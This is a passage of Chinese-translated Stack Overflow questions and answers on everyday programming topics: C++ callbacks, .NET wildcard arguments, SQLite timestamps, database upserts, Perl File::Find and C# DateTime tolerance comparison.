typedef void (*cb)(void*);
void funcThatNeedsCallback(cb thecallback, void *thedata) {
    // blah blah
    thecallback(thedata);
} 
```

做：

```
template<typename T>
void funcThatNeedsCallback(T &thefunctor) {
    // blah blah
    thefunctor();
} 
```

然后调用者执行：

```
struct MyFunctor {
    int mydata1;
    char *mydata2;
    void operator()(void) {
        // do something with mydata1 and mydata2
    }
};

MyFunctor mf = { value1, value2 };
funcThatNeedsCallback(mf); 
```

显然，如果您愿意，可以将成员设为私有并将它们传递给构造函数，而不是使用初始化列表。

如果您担心模板（例如，如果 funcThatNeedsCallback 是很多重复的代码），那么使用抽象类来定义参数必须具有的虚拟方法，并将该方法用作回调：

```
class CallbackInterface {
    virtual void theCallback(void) = 0;
    virtual ~CallbackInterface() {} // just in case
};

void funcThatNeedsCallback(CallbackInterface &cb) {
    // blah blah
    cb.theCallback();
} 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2008-12-19T18:26:33.550

当与 boost::bind 一起使用时，Boost.Function 在 1.34 左右显着提高了性能。如果您使用旧的 bo​​ost 版本进行了配置，则可以使用更新的版本再次进行配置。`boost::function`能够将小函数对象保存在堆栈上分配的小缓冲区中，而不是堆上（使用放置新）。

请参阅此邮件列表消息： http: [//lists.boost.org/Archives/boost/2006/01/98993.php](http://lists.boost.org/Archives/boost/2006/01/98993.php)。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-12-19T20:44:12.667

有[libsigc++](http://libsigc.sourceforge.net/)。许可证是 LGPL，但实现是关于 Boost.Signal 的作用（我正在阅读“太重量级”的意思是“安装所有 Boost 太重量级”而不是“Boost.Signal 太慢”）。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2010-01-22T10:50:46.927

捍卫 boost::binds 速度的人可能从未编写过低延迟交易系统或高速图形库。
Boost 是一个很好的通用库，而不是速度优化的库。相比之下，一些 boost 库（与调整后的实现相比）可能相当慢。

对于函数/委托，请参阅[http://www.codeproject.com/KB/cpp/fastdelegate2.aspx](http://www.codeproject.com/KB/cpp/fastdelegate2.aspx)以获得有用的比较。

再见。

# c# - .net 应用程序是否有通配符扩展选项？

> ID：381366
> 
> 赞同：19
> 
> 时间：2008-12-19T15:50:40.637
> 
> 标签：c#, .net, vb.net, wildcard

过去，我在许多 C 和 C++ 应用程序中使用了[扩展通配符参数的 setargv.obj 链接](http://msdn.microsoft.com/en-us/library/8bch7bkk.aspx)，但对于 .net 应用程序，我找不到任何类似的提及。

**是否有一种*标准*方法可以让您的应用程序的命令行参数自动扩展通配符？**（即，将 *.doc 从 args 参数中的一个条目扩展到与该通配符匹配的所有条目）。

PS我已经为我当前的小项目与 Directory.GetFiles() 一起破解了一些东西，但它不包括带有路径的通配符（还），如果没有自定义代码会很好。

**更新：**为了说明，这是我的粗略技巧。它需要为 GetFiles 拆分路径和名称的参数，但这是一般的想法。将 setargv.obj 链接到 C 或 C++ 应用程序基本上会完成所有通配符扩展，让用户只遍历 argv 数组。

```
 static void Main(string[] args)
{
    foreach (String argString in args)
    {
        // Split into path and wildcard
        int lastBackslashPos = argString.LastIndexOf('\\') + 1;
        path = argString.Substring(0, lastBackslashPos);
        filenameOnly = argString.Substring(lastBackslashPos, 
                                   argString.Length - lastBackslashPos);

        String[] fileList = System.IO.Directory.GetFiles(path, filenameOnly);
        foreach (String fileName in fileList)
        {
            //do things for each file
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2010-05-12T13:23:19.180

这是我粗略的技巧。我希望它是递归的。经历过 Windows 通配符的缺点后，我可能决定使用正则表达式，而不是让 GetFiles() 为我做这件事。

```
using System.IO;

public static string[] ExpandFilePaths(string[] args)
{
    var fileList = new List<string>();

    foreach (var arg in args)
    {
        var substitutedArg = System.Environment.ExpandEnvironmentVariables(arg);

        var dirPart = Path.GetDirectoryName(substitutedArg);
        if (dirPart.Length == 0)
            dirPart = ".";

        var filePart = Path.GetFileName(substitutedArg);

        foreach (var filepath in Directory.GetFiles(dirPart, filePart))
            fileList.Add(filepath);
    }

    return fileList.ToArray();
} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-12-19T16:37:14.443

我不确定你到底在追求什么......但如果我用你提到的 Directory.GetFiles() “hack”得到你要去的地方，那么这样的事情可能会起作用：

```
var Dirs = Directory.GetDirectories(@"C:\Windows", "sys*", 
SearchOption.TopDirectoryOnly).ToList();
var Files = new List<String>();
Dirs.ForEach(dirName => Files.AddRange(Directory.GetFiles(dirName, "*.sys", SearchOption.AllDirectories))); 
```

GetDirectories 调用上的通配符选项将允许您获取 Windows 文件夹中包含的所有目录 [直接] 匹配模式“sys*”。

然后，您可以遍历这些文件夹，获取与模式“*.sys”匹配的所有文件。

这就是你要找的东西吗？要自动扩展参数，您必须以某种有意义的方式提取通配符并将它们应用于该模型......

例如：

RunMyApp "C:\Windows\Sys*\ *.sys"

您将提取字符串 C:\Windows - 可能使用正则表达式，找到不包含通配符的最低级别目录并将其应用于 GetDirectories 方法，将通配符字符串作为搜索参数附加。

然后，如果您的字符串结尾（在本例中为 *.sys）作为 Directory.GetFiles 的搜索模式。

如果您想变得更复杂并执行以下操作：

```
C:\Windows\*\Sys*\*.sys 
```

您将使用 SearchOptions 来设置此行为：

```
Directory.GetDirectories(@"C:\Windows", "sys*", SearchOptions.AllDirectories) 
```

这将抓取与 Windows 目录中的 sys* 通配符匹配的所有目录及其下的所有目录。

如果您想变得比这更复杂，那么我不确定您将如何做到这一点...例如，假设您想要直接包含在 Windows 目录中的文件夹中的文件夹-我不知道您会如何恐怕要去做类似的事情......我不认为将整个树结构导出到 XML 并使用 XPath 来做到这一点会如此高效 - 使用通配符解析 XPath 将非常简单 - 但转换为XML不会那么有效......

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-07-16T04:39:43.507

查看 Microsoft.Build.dll 中反汇编的 Microsoft.Build.Shared.FileMatcher 类的源代码，您可以从方法 GetFiles 的实现中得到一些想法。

作为客户，您可以使用以下方法

```
var filelist = FileMatcher.GetFiles(@"c:\alaki",@"c:\alaki\**\bin\*.dll"); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-12-23T00:51:24.053

你的代码看起来就像你应该做的那样。

# asp.net - ASP .NET 2.0 控制状态与 ViewState

> ID：381369
> 
> 赞同：0
> 
> 时间：2008-12-19T15:52:19.447
> 
> 标签：asp.net, viewstate

新的 ControlState 功能是仅适用于自定义控件还是也适用于标准服务器控件？

也就是说..您可以使用 Detailsview、Gridview 等标准控件禁用整个页面的 ViewState 并且它仍然可以工作吗？**ControlState 是否适用于标准服务器控件？**

或者为了将 ControlState 用于标准服务器控件，您必须通过创建新的自定义 GridView/DetailsView 来修改它们的行为？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-19T16:54:19.230

来自[微软文档](http://msdn.microsoft.com/en-us/library/1whwt1k7.aspx)。

> 仅对对于跨回发进行控制至关重要的少量关键数据使用控制状态。不要使用控制状态来替代视图状态。

从这里你可以猜到 GridView 和其他项目不会在 ControlState 中存储大量信息，所以我猜如果你想这样做，违反微软的建议，你必须扩展基本控件来做它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-11-17T13:58:43.573

您可以禁用所有页面的视图状态，但您需要在每次回发中重新绑定 datagrid、dataview。

有时它比在客户端上保存一个巨大的视图状态效果更好。

对于标准服务器控件：如果您在初始化后修改控件属性，那么所有修改也将保存在 ViewState 中。

这是很棒的[关于 ViewState 的 Scott Mitchell 帖子](http://msdn.microsoft.com/en-us/library/ms972976.aspx)。

# java - 我应该在 java 1.5.0_16 和 PostgreSQL 8.3.5 中使用哪个 JDBC jar？

> ID：381370
> 
> 赞同：0
> 
> 时间：2008-12-19T15:52:24.063
> 
> 标签：java, postgresql, jdbc

我应该在 java 1.5.0_16 和 PostgreSQL 8.3.5 中使用哪个 JDBC jar？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-19T16:44:57.080

您对标准 postgresql JDBC 驱动程序有疑问吗？我现在没有使用它，但我过去使用过并且效果很好：http: [//jdbc.postgresql.org/](http://jdbc.postgresql.org/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-30T18:58:14.713

jdbc4 只能与 java 1.6+ 一起使用，因此您需要 8.3-XYZ.jdbc3。

# sql - Sqlite：CURRENT_TIMESTAMP 是 GMT，不是机器的时区

> ID：381371
> 
> 赞同：137
> 
> 时间：2008-12-19T15:53:32.940
> 
> 标签：sql, sqlite, timezone, timestamp

我有一个带有此列定义的 sqlite (v3) 表：

```
"timestamp" DATETIME DEFAULT CURRENT_TIMESTAMP 
```

此数据库所在的服务器位于 CST 时区。当我在不包含时间戳列的情况下插入表时，sqlite 会自动使用 GMT 中的当前时间戳填充该字段，而不是 CST。

有没有办法修改我的插入语句以强制存储的时间戳在 CST 中？另一方面，最好将它存储在 GMT 中（例如，以防数据库移动到不同的时区），所以有没有办法可以修改我的选择 SQL 以将存储的时间戳转换为 CST从表中提取它？

* * *

## 回答 #1

> 赞同：162
> 
> 时间：2008-12-19T16:04:28.907

我在 sqlite 文档（[https://www.sqlite.org/lang_datefunc.html](https://www.sqlite.org/lang_datefunc.html)）上找到了这段文字：

> 计算给定 unix 时间戳 1092941466 的日期和时间，并补偿您的本地时区。

```
SELECT datetime(1092941466, 'unixepoch', 'localtime'); 
```

这看起来不符合我的需要，所以我试着稍微改变一下“datetime”函数，最后得到了这个：

```
select datetime(timestamp, 'localtime') 
```

这似乎有效 - 这是为您的时区转换的正确方法，还是有更好的方法来做到这一点？

* * *

## 回答 #2

> 赞同：80
> 
> 时间：2010-05-30T14:42:08.777

只需使用本地时间作为默认时间：

```
CREATE TABLE whatever(
     ....
     timestamp DATE DEFAULT (datetime('now','localtime')),
     ...
); 
```

* * *

## 回答 #3

> 赞同：22
> 
> 时间：2008-12-19T16:08:51.223

作为一项规则，您应该在 GMT 中保留数据库中的时间戳，并且仅在您可以将它们转换为用户（而不是服务器）的本地时间戳时将它们转换为输入/输出的本地时间。

如果您可以执行以下操作，那就太好了：

```
SELECT DATETIME(col, 'PDT') 
```

...在太平洋夏令时为用户输出时间戳。不幸的是，这不起作用。但是，根据[这个 SQLite 教程](http://souptonuts.sourceforge.net/readme_sqlite_tutorial.html)（向下滚动到“其他日期和时间命令”），您可以询问时间，然后同时应用偏移量（以小时为单位）。因此，如果您确实知道用户的时区偏移量，那就太好了。

不处理夏令时规则，虽然......

* * *

## 回答 #4

> 赞同：16
> 
> 时间：2009-02-21T03:38:59.617

在（公认的罕见）需要本地数据时间的情况下（例如，我将本地时间存储在我的一个数据库中，因为我只关心一天中的时间是什么，并且我不跟踪我在哪里就时区而言...），您可以将列定义为

```
"timestamp" TEXT DEFAULT (strftime('%Y-%m-%dT%H:%M','now', 'localtime')) 
```

%Y-%m-%dT%H:%M 部分当然是可选的；这正是我喜欢我的时间被存储的方式。[另外，如果我的印象是正确的，sqlite中没有“DATETIME”数据类型，因此在列声明中使用TEXT或DATETIME作为数据类型并不重要。]

* * *

## 回答 #5

> 赞同：9
> 
> 时间：2009-08-11T18:11:17.640

当使用“ `NOT NULL DEFAULT CURRENT_TIMESTAMP`”定义列时，插入的记录将始终设置为 UTC/GMT 时间。

这是我为避免在 INSERT/UPDATE 语句中包含时间所做的操作：

```
--Create a table having a CURRENT_TIMESTAMP:
CREATE TABLE FOOBAR (
    RECORD_NO INTEGER NOT NULL,
    TO_STORE INTEGER,
    UPC CHAR(30),
    QTY DECIMAL(15,4),
    EID CHAR(16),
    RECORD_TIME NOT NULL DEFAULT CURRENT_TIMESTAMP)

--Create before update and after insert triggers:
CREATE TRIGGER UPDATE_FOOBAR BEFORE UPDATE ON FOOBAR
    BEGIN
       UPDATE FOOBAR SET record_time = datetime('now', 'localtime')
       WHERE rowid = new.rowid;
    END

CREATE TRIGGER INSERT_FOOBAR AFTER INSERT ON FOOBAR
    BEGIN
       UPDATE FOOBAR SET record_time = datetime('now', 'localtime')
       WHERE rowid = new.rowid;
    END 
```

测试看看是否有效...

```
--INSERT a couple records into the table:
INSERT INTO foobar (RECORD_NO, TO_STORE, UPC, PRICE, EID)
    VALUES (0, 1, 'xyz1', 31, '777')

INSERT INTO foobar (RECORD_NO, TO_STORE, UPC, PRICE, EID)
    VALUES (1, 1, 'xyz2', 32, '777')

--UPDATE one of the records:
UPDATE foobar SET price = 29 WHERE upc = 'xyz2'

--Check the results:
SELECT * FROM foobar 
```

希望有帮助。

* * *

## 回答 #6

> 赞同：9
> 
> 时间：2014-01-16T17:53:23.507

```
SELECT datetime('now', 'localtime'); 
```

* * *

## 回答 #7

> 赞同：9
> 
> 时间：2015-04-22T14:36:05.160

`SELECT datetime(CURRENT_TIMESTAMP, 'localtime')`

* * *

## 回答 #8

> 赞同：5
> 
> 时间：2014-11-07T05:26:41.497

`Time ( 'now', 'localtime' )`和日期`( 'now', 'localtime' )`工作。

* * *

## 回答 #9

> 赞同：4
> 
> 时间：2016-02-03T18:01:01.483

您也可以使用 strftime() 将时间列转换为时间戳：

```
SELECT strftime('%s', timestamp) as timestamp FROM ... ; 
```

给你：

> 1454521888

'timestamp' 表列甚至可以是文本字段，使用`current_timestamp`as DEFAULT。

没有 strftime：

```
SELECT timestamp FROM ... ; 
```

给你：

> 2016-02-03 17:51:28

* * *

## 回答 #10

> 赞同：3
> 
> 时间：2009-02-20T23:46:43.310

我认为这可能会有所帮助。

```
SELECT datetime(strftime('%s','now'), 'unixepoch', 'localtime'); 
```

* * *

## 回答 #11

> 赞同：3
> 
> 时间：2012-11-14T02:22:32.480

当前时间，在您机器的时区中：

```
select time(time(), 'localtime'); 
```

根据[http://www.sqlite.org/lang_datefunc.html](http://www.sqlite.org/lang_datefunc.html)

# java - 插入失败然后更新或加载，然后决定是插入还是更新

> ID：381373
> 
> 赞同：0
> 
> 时间：2008-12-19T15:54:22.923
> 
> 标签：java, database, performance

我在 java 中有一个 web 服务，它接收要在数据库中插入或更新的信息列表。我不知道要插入或更新哪一个。

哪一种是获得更好性能结果的最佳方法：

1.  遍历列表（一个对象列表，上面有表 pk），尝试在数据库中插入条目。如果插入失败，请运行更新

2.  尝试从数据库加载条目。如果检索到的结果更新，如果没有插入条目。

3.  另外一个选项？告诉我怎么回事儿 ：）

在第一次通话中，我相信大多数条目将是新的 bd 条目，但会有一个饱和点，大多数条目将被更新。

我说的是一个数据库表，它可以以成熟的形式达到超过 1 亿个条目。

你的方法是什么？性能是我最重要的目标。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-12-19T16:16:59.350

如果您的数据库支持 MERGE，我会认为这是最有效的（并将所有数据视为一个集合）。

看：

[http://www.oracle.com/technology/products/oracle9i/daily/Aug24.html](http://www.oracle.com/technology/products/oracle9i/daily/Aug24.html)

[https://web.archive.org/web/1/http://blogs.techrepublic%2ecom%2ecom/datacenter/?p=194](https://web.archive.org/web/1/http://blogs.techrepublic%2ecom%2ecom/datacenter/?p=194)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-19T16:00:33.563

如果性能是你的目标，那么首先从你的词汇表中去掉迭代这个词！学习成套做事。

如果您需要更新或插入，请始终先进行更新。否则很容易发现自己更新了不小心插入的记录。如果您这样做，它有助于有一个标识符，您可以查看该记录是否存在。如果标识符存在，则进行更新，否则进行插入。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-19T16:08:11.553

重要的是要了解插入数量与您收到的列表上的更新数量之间的平衡或比率。恕我直言，您应该实施一个抽象策略，即“将其保存在数据库中”。然后创建具体的策略（例如）：

1.  检查主键，如果找到零记录则插入，否则更新
2.  是否更新，如果失败，是否插入。
3.  *其他*

然后从配置文件中提取要使用的策略（例如类完全限定名）。这样，您可以轻松地从一种策略切换到另一种策略。如果可行，可能取决于您的域，您可以放置​​一个启发式方法，根据集合上的输入实体选择最佳策略。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-12-19T17:30:20.997

MySQL 支持这一点：

```
INSERT INTO foo
SET bar='baz', howmanybars=1
ON DUPLICATE KEY UPDATE howmanybars=howmanybars+1 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-12-20T22:05:01.533

选项 2 不会是最有效的。当您执行实际插入或更新以强制执行主键时，数据库将已经为您进行此检查。通过自己进行此检查，您将产生两倍的表查找开销以及 Java 代码的额外往返。选择最有可能的情况并乐观地编码。

扩展选项 1，您可以使用存储过程来处理插入/更新。这个 PostgreSQL 语法的例子假设插入是正常情况。

```
CREATE FUNCTION insert_or_update(_id INTEGER, _col1 INTEGER) RETURNS void
AS $$
    BEGIN
        INSERT INTO
            my_table (id, col1)
        SELECT
            _id, _col1;
    EXCEPTION WHEN unique_violation THEN
        UPDATE
            my_table
        SET
            col1 = _col1
        WHERE
            id = _id;
    END;
END;
$$
LANGUAGE plpgsql; 
```

您还可以将更新设为正常情况，然后检查受更新语句影响的行数以确定该行是否实际上是新的，并且您需要进行插入。

正如在其他一些答案中所提到的，处理此操作的最有效方法是一批：

1.  获取传递给 Web 服务的所有行并将它们批量插入到临时表中
2.  从临时表更新主表中的行
3.  从临时表在主表中插入新行
4.  处理临时表

要使用的临时表的类型和管理它的最有效方法将取决于您使用的数据库。

# asp.net - asp.net web 应用程序中奇怪的缓慢 - VS 2008

> ID：381375
> 
> 赞同：1
> 
> 时间：2008-12-19T15:54:34.607
> 
> 标签：asp.net

我在发布模式下编译了我的应用程序。然后我继续“发布”该网站。

复制所有文件并将它们移动到具有静态 IP 的登台服务器。重新启动 IIS。

转到另一台机器并访问我的网站。仅显示默认页面大约需要 4 秒，该页面是纯 HTML，没有使用自定义框架。是什么赋予了？？？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-12-19T15:57:12.120

听起来这只是应用程序池在旋转。假设您是部署后第一个点击它的人，这并不少见。第一页点击后它看起来很好，对吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-19T15:58:03.960

如果您设置@Page 指令变量“Trace=True”，是否会显示任何不合适的加载时间？此外，如果您连接到数据库，例如运行 SQL Profiler 将向您显示任何太慢的数据库查询。

最后，我遇到了一个奇怪的问题，我有一个虚拟目录设置，它指向一个不存在的目录。查找它时发生的网络超时需要一段时间。

# java - 在 MVC 应用程序中为视图层使用 JSTL 与 Velocity 的好处？

> ID：381377
> 
> 赞同：11
> 
> 时间：2008-12-19T15:56:45.680
> 
> 标签：java, spring, jsp, spring-mvc, velocity

我目前正在构建一个 Spring MVC 应用程序。我希望使用带有标记库的 JSP 页面来处理视图层和 HTML 格式，但是我遇到了我公司中的另一个小组，他们使用 Velocity 模板来实现相同的目的。

在我看来，这两种方法之间似乎有很多相似之处：

1.  两者都有易于理解的语法。让非开发人员更容易理解和使用，让设计人员专注于 HTML/CSS，只需要在需要条件/动态内容的少数情况下使用指令/标签库，而不必完全了解爪哇。
2.  很容易看出内容的哪些部分是 HTML 与哪些是指令/逻辑。
3.  两者都被大量使用并得到很好的支持。
4.  易于与 Spring MVC 集成。

但是在比较这两种技术时，我看不出使用其中一种技术的任何具体原因。我很难想到 Velocity 或 JSTL 特有的任何缺点。

所以我的问题是，您认为每种方法的优缺点是什么？如果您使用其中一个或另一个构建了一个（Spring）MVC 应用程序，是什么让您决定您正在使用的视图层技术，以及是什么（如果有的话）让您决定反对另一个？

**更新**：我在 Spring Framework 论坛的[here](http://forum.springframework.org/archive/index.php/t-10443.html)上找到了关于该主题的类似讨论，这对于在 JSTL 和 Velocity 之间做出相同决定的人来说可能会有些兴趣。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2008-12-19T20:00:48.307

我更喜欢使用 Velocity 只是因为使用 JSP+JSTL 可以让懒惰/草率的开发人员通过添加脚本而陷入困境。应该没有理由在您的视图层中有 java 代码。了解 Velocity 并不需要太多时间，事实上我只是在大约两周内学会了它。虽然我不喜欢输出的格式，但在大多数情况下它工作得很好。我们实际上并没有在应用程序的视图层中使用它，而是用于生成 HTML 以供其他浏览器使用。我们将 Velocity 的输出保存为文件，然后将其部署到不同的服务器以供其他 Web 客户端使用。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2009-01-01T06:15:58.900

实际上，我更喜欢 Freemarker 而不是 Velocity，以防万一您愿意探索其他选项。这里比较：

[http://freemarker.org/fmVsVel.html](http://freemarker.org/fmVsVel.html)

我同意 Ben 关于通过避免 JSP 和 scriptlet 的可能性来强制执行简单视图的说法。我还喜欢在任何类型的执行环境（JUnit、main() 方法）中呈现 Freemarker 或 Velocity 模板的能力，而无需像 JSP 那样需要 Servlet/JSP 容器。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-02-02T22:46:05.457

JSP 也更难以在视觉上与嵌入的 HTML 区分开来。使用速度，这是非常明显的。

此外，VelocityTools 包提供了大量的附加功能。

# perl - 找到特定文件后，如何摆脱递归查找功能？

> ID：381395
> 
> 赞同：5
> 
> 时间：2008-12-19T16:04:58.500
> 
> 标签：perl, recursion, file-find

我正在使用该`File::Find`模块来遍历目录树。找到特定文件后，我想停止搜索。我怎样才能做到这一点？

```
 find (\$processFile, $mydir);

   sub processFile() {
      if ($_ =~ /target/) {
         # How can I return from find here?
      }
   } 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2008-12-19T16:29:00.123

似乎你将不得不死：

```
eval {
    find (\$processFile, $mydir);
};

if ( $@ ) {
   if ( $@ =~ m/^found it/ ) {
        # be happy
    }
    else ( $@ ) {
        die $@;
    }
}
else {
   # be sad
}

sub processFile() {
   if ($_ =~ /target/) {
      die 'found it';
   }
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-12-19T19:53:02.177

除了其他人所说的之外，您可能希望看看[File-Find-Object](http://search.cpan.org/dist/File-Find-Object/)，它既是迭代的（因此能够在中间被中断）并且能够实例化（因此您可以启动和使用几个一次，或在执行另一次扫描时基于 FFO 对象实例化等）

它的缺点是它不是核心，但它只有 Class::Accessor 作为依赖项，并且是纯 Perl，因此安装起来应该不难。

我应该警告你，我是它的维护者，所以我可能有点偏见。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-19T16:17:51.610

你能在 Perl 中抛出自定义异常吗？

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-19T18:55:18.937

如果找到结果，您可以使用命名块并跳转到它（下一个，最后一个，这取决于您的需要）。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2008-12-19T16:51:29.000

我找到了这个链接：

[http://www.perlmonks.org/index.pl?node_id=171367](http://www.perlmonks.org/index.pl?node_id=171367)

我复制了该帖子列表中的一个脚本，这似乎有效：

```
#! /usr/bin/perl -w

use strict;
use File::Find;

my @hits = ();
my $hit_lim = shift || 20;

find(
    sub {
        if( scalar @hits >= $hit_lim ) {
            $File::Find::prune = 1;
            return;
        }
        elsif( -d $_ ) {
            return;
        }
        push @hits, $File::Find::name;
    },
    shift || '.'
);

$, = "\n";
print @hits, "\n"; 
```

看来这实际上是通过使用 $File::Find::prune 导致 find 不再遍历。

* * *

## 回答 #6

> 赞同：-4
> 
> 时间：2008-12-19T16:31:42.410

如果找到文件，函数 processFile() 应该返回 true，否则返回 false。所以，每次 processFile 调用自己时都应该检查这个返回值。如果为真，则递归调用已找到该文件，因此无需再次调用自己，它也必须返回真。如果它是假的，文件还没有找到，它应该继续搜索。

# c# - 根据 c# 中另一个选择来过滤列表框的最有效方法是什么？

> ID：381396
> 
> 赞同：0
> 
> 时间：2008-12-19T16:05:15.910
> 
> 标签：c#, asp.net, data-binding, listbox

我有几个列表框，它们从单独的存储过程中获取每个数据。

如果用户在 1 个列表框中选择一个选项，它应该过滤其他列表框。

我以前通过向存储过程添加逻辑来完成此操作，但有时它似乎变得很长。

有谁知道更好的方法来解决这个问题？

我现在设置它的方式是，对于每个 ListBox，我都有一个 ObjectDataSource，它调用一个方法，该方法调用数据库中的存储过程来填充列表框。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-19T16:13:22.150

您可以尝试更改代码，以便列表框不直接绑定到 ADO.Net 数据表，而是绑定到 DataView。DataViews 可以独立于它们所基于的底层 DataTable 进行排序和过滤...

假设 LBStates 是状态列表框，lbCities 是城市列表框，dtCities 是表单级别的 DataTable 变量，其中包含所有城市，并且它有一个状态列...

```
 DataView dvCities = dtCities.DefaultView; 
     dvCities.RowFilter = "State=" + lbStates.SelectedItem;
     lbCities.DataSource = dvCities; 
```

将 selectedIndexChanged 事件连接到状态列表框（在初始化代码中）

```
 lbStates.SelectedIndexChanged += lbStates_SelectedIndexChanged; 
```

并在 States ListBox SelectedIndexChanged 事件中，添加相同的代码...

```
 private void lbStates_SelectedIndexChanged(object sender, event e)
  {
     DataView dvCities = dtCities.DefaultView; 
     dvCities.RowFilter = "State=" + lbStates.SelectedItem;
     lbCities.DataSource = dvCities;
  } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-19T16:13:36.223

列表框通常用于显示不经常更改的“查找”数据。就像状态或实体类型的列表。因此，在尝试提高效率时要考虑的一件事是缓存。每次您想要获取状态列表时，都没有理由往返于数据库。

此外，如果您可能希望在单个数据库调用中返回所有列表框数据并存储在强类型数据集中。然后，您可以根据列表框选择过滤数据集内容，并将数据集内容重新绑定到其他列表框。

# c# - 如何在 C# 中使用指定的容差比较 DateTime 对象？

> ID：381401
> 
> 赞同：34
> 
> 时间：2008-12-19T16:08:50.990
> 
> 标签：c#, datetime, comparison, resolution

默认情况下，C# 将 DateTime 对象与 100ns 刻度进行比较。但是，我的数据库将 DateTime 值返回到最接近的毫秒。使用指定容差比较 C# 中两个 DateTime 对象的最佳方法是什么？

编辑：我正在处理截断问题，而不是舍入问题。正如乔在下面指出的那样，四舍五入的问题会引入新的问题。

对我有用的解决方案是以下这些的组合。

```
(dateTime1 - dateTime2).Duration() < TimeSpan.FromMilliseconds(1) 
```

如果差异小于一毫秒，则返回 true。对 Duration() 的调用对于获取两个日期之间差异的绝对值很重要。

* * *

## 回答 #1

> 赞同：31
> 
> 时间：2008-12-19T16:16:24.283

我通常使用 TimeSpan.FromXXX 方法来做这样的事情：

```
if((myDate - myOtherDate) > TimeSpan.FromSeconds(10))
{
   //Do something here
} 
```

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2008-12-19T16:20:45.363

DateTime 的扩展方法如何制作一个流畅的界面（这些都是风靡一时的，对吧？）

```
public static class DateTimeTolerance
{
    private static TimeSpan _defaultTolerance = TimeSpan.FromSeconds(10);
    public static void SetDefault(TimeSpan tolerance)
    {
        _defaultTolerance = tolerance;
    }

    public static DateTimeWithin Within(this DateTime dateTime, TimeSpan tolerance)
    {
        return new DateTimeWithin(dateTime, tolerance);
    }

    public static DateTimeWithin Within(this DateTime dateTime)
    {
        return new DateTimeWithin(dateTime, _defaultTolerance);
    }
} 
```

这依赖于一个类来存储状态并为 == 和 != 定义几个运算符重载：

```
public class DateTimeWithin
{
    public DateTimeWithin(DateTime dateTime, TimeSpan tolerance)
    {
        DateTime = dateTime;
        Tolerance = tolerance;
    }

    public TimeSpan Tolerance { get; private set; }
    public DateTime DateTime { get; private set; }

    public static bool operator ==(DateTime lhs, DateTimeWithin rhs)
    {
        return (lhs - rhs.DateTime).Duration() <= rhs.Tolerance;
    }

    public static bool operator !=(DateTime lhs, DateTimeWithin rhs)
    {
        return (lhs - rhs.DateTime).Duration() > rhs.Tolerance;
    }

    public static bool operator ==(DateTimeWithin lhs, DateTime rhs)
    {
        return rhs == lhs;
    }

    public static bool operator !=(DateTimeWithin lhs, DateTime rhs)
    {
        return rhs != lhs;
    }
} 
```

然后在您的代码中，您可以执行以下操作：

```
DateTime d1 = DateTime.Now;
DateTime d2 = d1 + TimeSpan.FromSeconds(20);

if(d1 == d2.Within(TimeSpan.FromMinutes(1))) {
    // TRUE! Do whatever
} 
```

扩展类还包含一个默认的静态容差，以便您可以为整个项目设置容差并使用不带参数的 Within 方法：

```
DateTimeTolerance.SetDefault(TimeSpan.FromMinutes(1));

if(d1 == d2.Within()) {  // Uses default tolerance
    // TRUE! Do whatever
} 
```

我有一些单元测试，但是在这里粘贴的代码有点太多了。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2008-12-19T16:18:03.420

您需要从日期对象中删除毫秒组件。一种方法是：

```
 DateTime d = DateTime.Now;
    d.Subtract(new TimeSpan(0, 0, 0, 0, d.Millisecond)); 
```

您还可以减去两个日期时间

d.减去（日期时间。现在）；

这将返回一个时间跨度对象，您可以使用它来比较天、小时、分钟和秒组件以查看差异。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-12-19T16:20:05.630

```
 if (Math.Abs(dt1.Subtract(dt2).TotalSeconds) < 1.0) 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2014-12-08T18:17:26.170

我和最初的提问者有类似的问题，但为了让事情更有趣，我正在保存和检索`Nullable<DateTime>`。

我喜欢[joshperry 的回答](https://stackoverflow.com/a/381435/3191599)并将其扩展到我的目的：

```
public static class DateTimeTolerance
{
    private static TimeSpan _defaultTolerance = TimeSpan.FromMilliseconds(10); // 10ms default resolution
    public static void SetDefault(TimeSpan tolerance)
    {
        _defaultTolerance = tolerance;
    }

    public static DateTimeWithin Within(this DateTime dateTime, TimeSpan tolerance)
    {
        return new DateTimeWithin(dateTime, tolerance);
    }

    public static DateTimeWithin Within(this DateTime dateTime)
    {
        return new DateTimeWithin(dateTime, _defaultTolerance);
    }

    // Additional overload that can deal with Nullable dates
    // (treats null as DateTime.MinValue)
    public static DateTimeWithin Within(this DateTime? dateTime)
    {
        return dateTime.GetValueOrDefault().Within();
    }

    public static DateTimeWithin Within(this DateTime? dateTime, TimeSpan tolerance)
    {
        return dateTime.GetValueOrDefault().Within(tolerance);
    }
}

public class DateTimeWithin
{
    public DateTimeWithin(DateTime dateTime, TimeSpan tolerance)
    {
